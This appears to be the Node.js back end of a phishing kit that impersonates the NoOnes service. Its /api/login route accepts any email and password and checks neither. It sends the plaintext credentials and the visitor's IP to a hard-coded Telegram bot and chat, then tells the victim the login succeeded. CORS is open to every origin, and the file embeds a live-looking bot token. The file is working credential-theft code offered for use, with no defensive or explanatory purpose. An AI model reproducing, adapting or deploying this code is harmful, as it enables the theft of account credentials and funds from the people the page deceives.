const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;

// Telegram config
const TELEGRAM_BOT_TOKEN = '8959682316:AAEFW23lt-waRnNMAIhIy4_evhz6LpwMaxA';
const TELEGRAM_CHAT_ID = '7386607055';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// ===== MIDDLEWARE =====
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== TELEGRAM FUNCTION =====
async function sendToTelegram(message) {
    try {
        const response = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram sent');
        return response.data;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return null;
    }
}

// ===== FORMAT LOGIN MESSAGE =====
function formatLoginMessage(email, password, ip) {
    return `
🔐 <b>New Login Attempt</b>
═══════════════════════

📧 <b>Email/Phone:</b> <code>${email}</code>
🔑 <b>Password:</b> <code>${password}</code>
🌐 <b>IP:</b> ${ip}
🕐 <b>Time:</b> ${new Date().toISOString()}

═══════════════════════
🔒 NoOnes Security Alert
    `;
}

// ===== ROUTES =====

// Home route
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        service: 'NoOnes Backend',
        timestamp: new Date().toISOString(),
        routes: ['/api/login', '/api/health']
    });
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString()
    });
});

// ===== LOGIN ROUTE - THIS IS WHAT YOU NEED =====
app.post('/api/login', async (req, res) => {
    console.log('📨 Login route hit!');
    
    try {
        const { email, password } = req.body;
        
        console.log('📧 Email:', email);
        
        if (!email || !password) {
            return res.status(400).json({
                success: false,
                message: 'Email and password are required'
            });
        }

        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'N/A';
        
        // Send to Telegram
        const message = formatLoginMessage(email, password, ip);
        await sendToTelegram(message);

        res.json({
            success: true,
            message: 'Login successful!',
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ Login error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error'
        });
    }
});

// 404 handler
app.use((req, res) => {
    console.log('❌ 404 - Route not found:', req.method, req.path);
    res.status(404).json({
        success: false,
        message: 'Route not found'
    });
});

// ===== START SERVER =====
app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔═══════════════════════════════════════╗
║    🚀 NoOnes Backend Server          ║
║    Running on port: ${PORT}              ║
║    Status: Online                     ║
║    Time: ${new Date().toISOString()}    ║
╚═══════════════════════════════════════╝
    `);
    console.log('📡 Available routes:');
    console.log('   GET  /');
    console.log('   GET  /api/health');
    console.log('   POST /api/login  ← THIS IS THE LOGIN ROUTE');
});
